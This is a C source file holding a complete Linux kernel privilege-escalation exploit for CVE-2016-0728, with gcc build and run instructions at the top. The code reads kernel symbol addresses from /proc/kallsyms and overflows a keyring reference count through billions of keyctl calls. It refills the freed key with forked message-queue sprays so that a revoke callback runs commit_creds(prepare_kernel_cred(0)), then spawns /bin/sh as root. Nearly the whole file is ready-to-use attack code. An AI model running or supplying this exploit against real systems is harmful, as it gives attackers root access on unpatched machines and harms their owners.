/* $ gcc cve_2016_0728.c -o cve_2016_0728 -lkeyutils -Wall */
/* $ ./cve_2016_072 PP_KEY */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <keyutils.h>
#include <unistd.h>
#include <time.h>
#include <unistd.h>

#include <sys/ipc.h>
#include <sys/msg.h>

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

#define STRUCT_LEN (0xb8 - 0x30)
// #define COMMIT_CREDS_ADDR (0xffffffff81094250)
// #define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)

void *
get_symbol(char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    char c, sym[512];
    void *addr;

    while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
        if (!strcmp(sym, name))
            return addr;
    }

    return NULL;
}

struct key_type {
    char * name;
    size_t datalen;
    void * vet_description;
    void * preparse;
    void * free_preparse;
    void * instantiate;
    void * update;
    void * match_preparse;
    void * match_free;
    void * revoke;
    void * destroy;
};

void userspace_revoke(void * key) {
    commit_creds(prepare_kernel_cred(0));
}

int main(int argc, const char *argv[]) 
{
    const char *keyring_name;
    size_t i = 0;
    unsigned long int l = 0x100000000/2;
    key_serial_t serial = -1;
    pid_t pid = -1;
    struct key_type * my_key_type = NULL;
    
    struct { 
        long mtype;
        char mtext[STRUCT_LEN];
    } msg = {0x4141414141414141, {0}};
    int msqid;

    if (argc != 2) {
        printf("\n\tUsage: %s <key_name>\n\n", argv[0]);
        return 1;
    }

    printf("[*] uid=%d, euid=%d\n", getuid(), geteuid()); 
    commit_creds = (_commit_creds) get_symbol("commit_creds");
    prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
    
    printf("[*] commit_creds @ 0x%08lx\n", (unsigned long)commit_creds); 
    printf("[*] prepare_kernel_cred @ 0x%08lx\n", (unsigned long)prepare_kernel_cred); 

    my_key_type = malloc(sizeof(*my_key_type));

    my_key_type->revoke = (void*)userspace_revoke;
    memset(msg.mtext, 'A', sizeof(msg.mtext));

    // key->uid
    *(int*)(&msg.mtext[56]) = 0x3e8; /* geteuid() */
    //key->perm
    *(int*)(&msg.mtext[64]) = 0x3f3f3f3f;

    //key->type
    *(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;

    if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        perror("msgget");
        exit(1);
    }

    keyring_name = argv[1];

    /* Set the new session keyring before we start */

    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);
    if (serial < 0) {
        perror("keyctl");
        return -1;
    }
    
    if (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) < 0) {
        perror("keyctl");
        return -1;
    }


    printf("[*] Increfing ... 0x00000000");

    for (i = 1; i < 0xfffffffd; i++) {
        printf("\b\b\b\b\b\b\b\b\b\b");
        printf("0x%08lx", i);
        if (i == (0xffffffff - l)) {
            l = l/2;
            printf("\b\b\b\b\b\b\b\b\b\b");
            printf("sleeping 5");
            sleep(5);
        }
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
            perror("keyctl");
            return -1;
        }
    }

    printf("\n[*] Sleeping for a while\n");
    sleep(5);

    printf("[*] Leaking the last reference to overflow\n");

    /* here we are going to leak the last references to overflow */
    for (i=0; i<5; ++i) {
        if (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) < 0) {
            perror("keyctl");
            return -1;
        }
    }

    printf("[*] Finished increfing\n");
    printf("[*] Forking...\n");

    /* allocate msg struct in the kernel rewriting the freed keyring object */
    for (i=0; i<64; i++) {
        pid = fork();
        if (pid == -1) {
            perror("fork");
            return -1;
        }

        if (pid == 0) {
            sleep(2);
            if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
                perror("msgget");
                exit(1);
            }
            printf("[*] Sending msg 00");
            for (i = 0; i < 64; i++) {
                printf("\b\b%2lu", i);
                if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
                    perror("msgsnd");
                    exit(1);
                }
            }
            sleep(-1);
            exit(1);
        }
    }
   
    printf("\n[*] Finished forking\n");
    printf("[*] Sleeping for a while\n");
    sleep(5);

    /* call userspace_revoke from kernel */
    printf("[*] Calling revoke ...\n");
    if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
        perror("keyctl_revoke");
    }

    printf("uid=%d, euid=%d\n", getuid(), geteuid());
    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}
